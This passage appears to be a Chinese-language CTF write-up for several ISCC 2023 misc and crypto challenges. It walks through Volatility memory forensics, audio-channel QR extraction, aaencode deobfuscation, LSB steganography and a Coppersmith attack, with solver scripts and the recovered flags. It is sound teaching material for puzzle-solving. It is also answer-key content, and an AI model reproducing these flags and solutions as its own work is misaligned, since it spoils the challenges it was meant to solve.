1f`vi+\\x9e0\\xde/\\x05\\x0c\\x14\\xea )\\xaf\\x89I!\\x99\\x17\\xb3\\xda\\x9etr\\x0e\\x9b\\xa5\\xadX\\x84\\x0e##e\\x1d+\\xdfr1\\xdaw)+\\x9b\\xe1\\x1bL\\xc3\\x96\\xaa(\\\\\\xb3\\x83^\\x93\\x12a\\xc3$\\xd4n\\xae\\x0f4\\xe9,X\\xda\\x1d&amp;.\\xee\\xcb\\x00&amp;rhic+hj69at8v*r346z9(b\\n&#x27;8039330494542762264300213857573453068197801831244267808262277880882326468945452291276327262618027621164332751136183902321165024824378554986536034339980169303989814524207279584316334199697903760884921335379759173878037547481485113269683620889227593745362299503829418529123616917575923953529190007023435018b&#x27;\\x02\\xeeH\\x0e4\\xc3\\x94\\x11\\t\\xaa\\x1d\\x95\\xb3\\x019\\xc1k\\x9ad\\x14\\xdc\\x94PS\\xb4|&#125;B4\\x809&amp;\\xa3v\\xce$\\xbe\\xe8\\xe84\\rO_E2\\x0c\\xa6PXM\\xc0\\xe9h\\xca\\x83\\x1b.Q\\x8dN\\xe0]\\xc5\\\\\\xf6\\xa1\\xe2|\\x93&#123;\\xc2\\x18\\x9dy`H\\xfd\\xcf2B@\\xac\\xed&quot;(%\\xf2x\\x92\\xc0\\x03\\xdb&#123;\\x9ek\\x9a6t7\\xf7&lt;h\\x00yawa5t0vr35-vr^if89%hu&#125;\\n&#x27; 得到flag 1ISCC&#123;iu5a!ui*3qehbca@90&amp;rhic+hj69at8v*r346z9(byawa5t0vr35-vr^if89%hu&#125; 16、菜鸟黑客2题目信息 123爱画画的菜鸟黑客小明尝试攻击了一台电脑，电脑中记录了他的百感交集的心情。附件下载链接：https://share.weiyun.com/z8AbACzC 密码：ISCC23 使用如下命令进行检查 linux 文件名带空格 要加\\ 1python vol.py -f ../Novice\\ hacker.raw filescan | grep Desktop 发现了几个图片 其中emoji比较特殊将该图片导出 1234vol.exe -o ./outputdir/ -f xxx.raw windows.dumpfiles --virtaddr 0xee1122vol.exe -o ./outputdir/ -f xxx.raw windows.dumpfiles --physaddr 0xee1122使用以下命令即可python3.10 vol.py -o ./outputdir/ -f 2.raw windows.dumpfiles --physaddr 0x000000007dfaff20 对得到的图片文件进行文件分离操作 1foremost 1.png 压缩包密码猜测为ISCC2023 得到一串密文 维吉尼亚密码 1MEQL&#123;invk_vhlu_dzel_lkof&#125; 密钥从图片的眼睛处获得 由眼睛的开闭得到一串摩斯电码 1./--/---/.---/../../.../..-./..-/-. 解之 1EMOJIISFUN 维吉尼亚密码解密 即可得到flag 1ISCC&#123;afdf_buhi_pqwd_tfus&#125; 17、通信方式左右声道差分 使用如下python脚本进行提取 123456789101112131415import scipy.io.wavfile as wavfilesamplerate, data = wavfile.read(&#x27;communication.wav&#x27;)left = []right = []for item in data: left.append(item[0]) right.append(item[1])diff = [left - right for left, right in zip(left, right)]# print(diff)a=&#x27;&#x27;for i in diff: if i !=0: a+=str(i)with open(&#x27;1.txt&#x27;,&#x27;w+&#x27;) as f: f.writelines(a) 全是1和2 应该是二维码 把2转为0之后 使用如下python脚本生成二维码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import osimport cv2import timeimport argparseimport itertoolsimport numpy as npparser = argparse.ArgumentParser()parser.add_argument(&#x27;-f&#x27;, type=str, default=None, required=True, help=&#x27;输入文件名称&#x27;)parser.add_argument(&#x27;-size&#x27;, type=int, default=5, help=&#x27;图片放大倍数(默认5倍)&#x27;)args = parser.parse_args()file_path = os.path.join(args.f)if not os.path.exists(&quot;./out&quot;): os.mkdir(&quot;./out&quot;)# read binary txtwith open(file_path, &quot;r&quot;) as f: data = f.read().strip()def draw_QR(img, reverse=False): for i, v in enumerate(data[:row*col]): right_bottom_point = (left_top_point[i][0] + size, left_top_point[i][1] + size) if not reverse: cv2.rectangle(img, left_top_point[i], right_bottom_point, color=( 255, 255, 255), thickness=-1) if v == &quot;0&quot; else cv2.rectangle(img, left_top_point[i], right_bottom_point, color=(0, 0, 0), thickness=-1) else: cv2.rectangle(img, left_top_point[i], right_bottom_point, color=(0, 0, 0), thickness=-1) if v == &quot;0&quot; else cv2.rectangle( img, left_top_point[i], right_bottom_point, color=(255, 255, 255), thickness=-1) return imgif __name__ == &#x27;__main__&#x27;: # 计算宽高 dic = &#123;X: int(len(data) / X) for X in range(1, len(data)) if len(data) % X == 0&#125; size = args.size for row, col in dic.items(): img1, img2 = np.zeros((row * size, col * size, 1)), np.zeros((row * size, col * size, 1)) left_top_point = [] for i, j in itertools.product(range(0, row * size, size), range(0, col * size, size)): left_top = (j, i) left_top_point.append(left_top) cv2.imwrite(f&quot;./out/&#123;col&#125;_&#123;row&#125;.png&quot;, draw_QR(img1, reverse=False)) cv2.imwrite(f&quot;./out/&#123;col&#125;_&#123;row&#125;_reverse.png&quot;, draw_QR(img2, reverse=True)) print(f&quot;[-] 宽度:&#123;col:6&#125; 高度:&#123;row:6&#125;, 已保存在运行目录out中...&quot;) print(&quot;[-] 已经遍历完所有情况, 即将自动关闭!&quot;) time.sleep(0.5) 执行 1python3.10 test.py -f 1.txt 得到很多二维码 选择最全的那一张 扫描 得到以下内容 15337 5337 2448 2448 0001 2448 0001 2161 1721 5337 2448 0759 4574 3024 3945 5337 0676 4122 3320 0001 4574 3945 5337 2448 0759 0759 6671 0008 3296 4122 2161 1721 然后中文电码转换得到以下内容 12345678910111213141516171819202122艾艾斯斯一斯一括弧艾斯啊第比由艾吃皮滋一第由艾斯啊啊达不溜皮括弧艾艾斯斯一斯一括弧艾斯啊第比由艾吃皮滋一第由艾斯啊啊达不溜皮括弧 然后读出来flag即可 1234ISCC&#123;SRDBUHPZDUSRRWP&#125;ISCC&#123;srdbuhpzdusrrwp&#125;ISCC&#123;SADBUHPZDUSAAWP&#125;ISCC&#123;sadbuhpzdusaawp&#125; 18、Brain Games尝试解压 发现需要密码打开压缩包 发现注释 1?ω??= /｀ｍ′）? ~┻━┻ //*′?｀*/ [&#x27;_&#x27;]; o=(???) =_=3; c=(?Θ?) =(???)-(???); (?Д?) =(?Θ?)= (o^_^o)/ (o^_^o);(?Д?)=&#123;?Θ?: &#x27;_&#x27; ,?ω?? : ((?ω??==3) +&#x27;_&#x27;) [?Θ?] ,???? :(?ω??+ &#x27;_&#x27;)[o^_^o -(?Θ?)] ,?Д??:((???==3) +&#x27;_&#x27;)[???] &#125;; (?Д?) [?Θ?] =((?ω??==3) +&#x27;_&#x27;) [c^_^o];(?Д?) [&#x27;c&#x27;] = ((?Д?)+&#x27;_&#x27;) [ (???)+(???)-(?Θ?) ];(?Д?) [&#x27;o&#x27;] = ((?Д?)+&#x27;_&#x27;) [?Θ?];(?o?)=(?Д?) [&#x27;c&#x27;]+(?Д?) [&#x27;o&#x27;]+(?ω?? +&#x27;_&#x27;)[?Θ?]+ ((?ω??==3) +&#x27;_&#x27;) [???] + ((?Д?) +&#x27;_&#x27;) [(???)+(???)]+ ((???==3) +&#x27;_&#x27;) [?Θ?]+((???==3) +&#x27;_&#x27;) [(???) - (?Θ?)]+(?Д?) [&#x27;c&#x27;]+((?Д?)+&#x27;_&#x27;) [(???)+(???)]+ (?Д?) [&#x27;o&#x27;]+((???==3) +&#x27;_&#x27;) [?Θ?];(?Д?) [&#x27;_&#x27;] =(o^_^o) [?o?] [?o?];(?ε?)=((???==3) +&#x27;_&#x27;) [?Θ?]+ (?Д?) .?Д??+((?Д?)+&#x27;_&#x27;) [(???) + (???)]+((???==3) +&#x27;_&#x27;) [o^_^o -?Θ?]+((???==3) +&#x27;_&#x27;) [?Θ?]+ (?ω?? +&#x27;_&#x27;) [?Θ?]; (???)+=(?Θ?); (?Д?)[?ε?]=&#x27;\\\\&#x27;; (?Д?).?Θ??=(?Д?+ ???)[o^_^o -(?Θ?)];(o???o)=(?ω?? +&#x27;_&#x27;)[c^_^o];(?Д?) [?o?]=&#x27;\\&quot;&#x27;;(?Д?) [&#x27;_&#x27;] ( (?Д?) [&#x27;_&#x27;] (?ε?+(?Д?)[?o?]+ (?Д?)[?ε?]+(?Θ?)+ ((o^_^o) - (?Θ?))+ (c^_^o)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (o^_^o)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ (o^_^o)+ ((???) + (o^_^o))+ (?Д?)[?ε?]+(?Θ?)+ (c^_^o)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ ((o^_^o) +(o^_^o))+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (???)+ (?Д?)[?ε?]+(?Θ?)+ (o^_^o)+ ((???) + (o^_^o))+ (?Д?)[?ε?]+(?Θ?)+ (?Θ?)+ (???)+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ ((???) + (o^_^o))+ (?Д?)[?ε?]+(?Θ?)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (?Θ?))+ (?Д?)[?o?]) (?Θ?)) (&#x27;_&#x27;); 发现是aaencode 但是发现常见的没有那么多问号 将问号替换为ﾟ发现python写有点麻烦 我就直接找了个字符替换的网站 1ﾟωﾟﾟ= /｀ｍ′）ﾟ ~┻━┻ //*′ﾟ｀*/ [&#x27;_&#x27;]; o=(ﾟﾟﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟﾟﾟ)-(ﾟﾟﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾟ : ((ﾟωﾟﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟﾟﾟﾟ :(ﾟωﾟﾟ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾟ:((ﾟﾟﾟ==3) +&#x27;_&#x27;)[ﾟﾟﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾟ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟﾟﾟ)+(ﾟﾟﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾟ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾟ==3) +&#x27;_&#x27;) [ﾟﾟﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟﾟﾟ)+(ﾟﾟﾟ)]+ ((ﾟﾟﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟﾟﾟ==3) +&#x27;_&#x27;) [(ﾟﾟﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟﾟﾟ)+(ﾟﾟﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟﾟﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟﾟﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾟ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟﾟﾟ) + (ﾟﾟﾟ)]+((ﾟﾟﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟﾟﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾟ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟﾟﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾟ=(ﾟДﾟ+ ﾟﾟﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟﾟﾟo)=(ﾟωﾟﾟ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟﾟﾟ)+ ((ﾟﾟﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟﾟﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟﾟﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟﾟﾟ)+ ((ﾟﾟﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟﾟﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟﾟﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟﾟﾟ)+ (ﾟﾟﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟﾟﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟﾟﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟﾟﾟ) + (ﾟΘﾟ))+ ((ﾟﾟﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟﾟﾟ)+ ((ﾟﾟﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;); 但是替换后仍然解码失败还需要手动进行替换下面给出一段1的aaencode编码 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;); 进行手动替换 当然可将ﾟﾟ 替换为 ﾟ-之后再进行操作 可以减少很多工作量 最后修改完成的aaencode 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) - (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(c^_^o)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;); 解密后得到 1Peace_And_Love 解压后得到一张图片 屏幕有弹痕 那么对照着手机键盘统计裂痕分支接触的数量得到应该是570831然后使用cloaked-pixel进行解码即可原版可能不能用 使用优化版即可网址 1https://github.com/Byxs20/cloacked-pixel-python3 命令 1python3.10 lsb.py extract ATM.png 570831 得到的结果 18ae511cd0026edf90ced84dd12f6d1d30fe3e486131c31501300014b2bacb4d202 直接cyberchef 然后magic 得到flag 把最后的S改成} 12ISCC&#123;04dae4de-7686-4598-96c5-66955ae3cba0SISCC&#123;04dae4de-7686-4598-96c5-66955ae3cba0&#125; 19、G9的钢琴曲123456789101112131415161718192021222324252627from Crypto.Util.number import *out =[(2172252055704676687457456207934570002654428519127702486311980109116704284191676330440328812486703915927053358543917713596131304154696440247623888101060090049, 2108637380559167544966298857366809660819309447678518955440217990535095703498823529603132157555536540927898101378853427638496799467186376541583898176373756917, 1103840869050032098984210850630584416814272073121760519116633450832540460407682739594980752914408375293588645043889636184344774987897378026909963273402766561), (2000124088829445641229622245114189828522912764366697463519930724825924163986998694550757186794149331654420524788899548639866463311104678617705042675360057243, 1665549488322348612920659576773850703765765307223600084262385091708189142517147893842872604879786471376822691498663100028754092239272226011616462859779271025, 990627294315894701092445987317798430568264256978762186489740206376279178571289900941886873570710241025125621594301020499270029956301204583788447662869037315), (1303516450844607175859180241406482278674954250245197644105258810912430306740632927947088058701010631209652921073238771523431247167608544636294883977018097199, 1119758042346732592435539174564881640374540951155805649314246375263320107846465196580695284748429608544175058830657524095385658523219250943378976577225782230, 598915905620934628053505443816290720352232457144997188593150390072666051798491983452700635551081569466232682512362475354896855707688259553722701065491789402), (2463333340881549805545364706970314608937871808508385657282029236077808399479795853056347857164089991597487727014937851894809199639758978587612411591527423763, 673590616457425981268507673967667728811152404125286063856277932080928372715113304373395326309595915550999528364692493169822993967220858400311382215177833045, 208198360150172881237486434064181246031019081636219908755237161625039285165750040108367852136975511290424988781713799103150982065579123496034803730006273360)]# clean datans = [o[0] for o in out]rs = [o[1] for o in out]cs = [o[2] for o in out]# calculate T_i for each polynomialcalcT = lambda idx : crt([0 if i != idx else 1 for i in range(4)], ns)# calculate TsT = [calcT(i) for i in range(len(ns))]# construct the final polynomialf = 0P.&lt;x&gt; = PolynomialRing(Zmod(prod(ns)))# use pad to add known bitspad = bytes_to_long(b&#x27;ISCC&#x27; + b&#x27;\\x00&#x27; * 59)m = x + pad# construct g(x)for i in range(4): f += T[i] * (m^4 + 3*m^2 + rs[i]*m - cs[i])root = f.small_roots(X=2^472, epsilon=0.03)[0]m = m(root)print(long_to_bytes(int(m))) 实际上使用的sagemath代码 1234567891011121314151617181920212223242526out =[(2172252055704676687457456207934570002654428519127702486311980109116704284191676330440328812486703915927053358543917713596131304154696440247623888101060090049, 2108637380559167544966298857366809660819309447678518955440217990535095703498823529603132157555536540927898101378853427638496799467186376541583898176373756917, 1103840869050032098984210850630584416814272073121760519116633450832540460407682739594980752914408375293588645043889636184344774987897378026909963273402766561), (2000124088829445641229622245114189828522912764366697463519930724825924163986998694550757186794149331654420524788899548639866463311104678617705042675360057243, 1665549488322348612920659576773850703765765307223600084262385091708189142517147893842872604879786471376822691498663100028754092239272226011616462859779271025, 990627294315894701092445987317798430568264256978762186489740206376279178571289900941886873570710241025125621594301020499270029956301204583788447662869037315), (1303516450844607175859180241406482278674954250245197644105258810912430306740632927947088058701010631209652921073238771523431247167608544636294883977018097199, 1119758042346732592435539174564881640374540951155805649314246375263320107846465196580695284748429608544175058830657524095385658523219250943378976577225782230, 598915905620934628053505443816290720352232457144997188593150390072666051798491983452700635551081569466232682512362475354896855707688259553722701065491789402), (2463333340881549805545364706970314608937871808508385657282029236077808399479795853056347857164089991597487727014937851894809199639758978587612411591527423763, 673590616457425981268507673967667728811152404125286063856277932080928372715113304373395326309595915550999528364692493169822993967220858400311382215177833045, 208198360150172881237486434064181246031019081636219908755237161625039285165750040108367852136975511290424988781713799103150982065579123496034803730006273360)]# clean datans = [o[0] for o in out]rs = [o[1] for o in out]cs = [o[2] for o in out]# calculate T_i for each polynomialcalcT = lambda idx : crt([0 if i != idx else 1 for i in range(4)], ns)# calculate TsT = [calcT(i) for i in range(len(ns))]# construct the final polynomialf = 0P.&lt;x&gt; = PolynomialRing(Zmod(prod(ns)))# use pad to add known bitspad = 15001385535896261059360668543631362456725704787123307112695998186453010771662030730083317511685098959514481534354800235577209792510231020420845902233600m = x + pad# construct g(x)for i in range(4): f += T[i] * (m^4 + 3*m^2 + rs[i]*m - cs[i])root = f.small_roots(X=2^472, epsilon=0.03)[0]m = m(root)print(int(m)) 得到结果 115001385540438096324725477067352131209678471984321492849971333976568485464829241029176623950061458127615831238801515936980848046941816018987552280596739 放进python 123from Crypto.Util.number import *m = 15001385540438096324725477067352131209678471984321492849971333976568485464829241029176623950061458127615831238801515936980848046941816018987552280596739print(long_to_bytes(int(m))) 得到压缩包密码 1ISCC_Y0u_R3alLy_KnOw_CoPPersm1th cloakify 解密 1python2 decloakify.py music.rar ./ciphers/desserts &gt; 1.wav 然后使用010editor打开1.wav看到了很多的-+ 因此推断是二进制使用如下python脚本进行解密 123456789with open(&#x27;1.wav&#x27;,&#x27;rb&#x27;) as f: hex_list = (&quot;&#123;:02X&#125;&quot;.format(int(c)) for c in f.read()) # 定义变量接受文件内容 buflist = list(hex_list) # 用列表保存信息，方便后续操作 for i in buflist: if i ==&#x27;2D&#x27;: print(0,end=&#x27;&#x27;) elif i == &#x27;2B&#x27;: print(1,end=&#x27;&#x27;) 得到了以下二进制串from binary 解码二进制后 成功得到flag 1ISCC&#123;Congr4tulations_on_complet1ng_th1s_ch4llenge&#125; 20、哦？摩斯密码？题目信息 1梅开二度，压缩包做累了就来试试easy的压缩包吧 使用如下python脚本 进行处理 12345678910111213141516171819import pyzbar.pyzbar as pyzbarfrom PIL import Imagefrom tqdm import tqdmimport osfrom collections import Counterflag = &#x27;&#x27;textment = []tmp = 0for i in range(4716): path = 